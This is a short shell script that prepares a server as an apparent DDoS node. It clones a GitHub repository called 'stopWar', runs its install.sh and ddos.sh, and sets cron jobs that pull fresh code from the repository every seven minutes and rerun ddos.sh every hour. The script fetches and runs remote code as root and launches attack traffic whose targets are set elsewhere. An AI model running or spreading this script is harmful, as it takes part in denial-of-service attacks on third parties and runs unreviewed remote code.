#!/bin/sh

set -e

apt-get update
apt-get upgrade -y
apt-get install -y git

cd /root && /usr/bin/git clone https://github.com/angelloGit/stopWar
cd /root/stopWar

./install.sh

./ddos.sh

crontab - <<__EOFF
*/7 * * * * cd $HOME/stopWar/ && /usr/bin/git pull
31 * * * * $HOME/stopWar/ddos.sh
__EOFF
